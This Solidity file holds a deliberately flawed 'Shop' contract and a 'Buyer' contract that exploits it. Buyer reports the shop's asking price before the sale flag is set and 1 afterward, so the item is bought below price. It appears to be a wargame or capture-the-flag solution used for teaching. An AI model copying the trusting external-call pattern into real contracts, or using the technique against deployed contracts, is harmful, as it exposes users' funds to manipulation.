// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Buyer is IBuyer {

    Shop public shop; 

    constructor (address shopAddress) {
        shop = Shop(shopAddress);
    }

    function buy() public {
        shop.buy();
    }

    function price() public view returns (uint256) {
        if (shop.isSold()) {
            return 1;
        } else {
            return shop.price();
        }
    }
}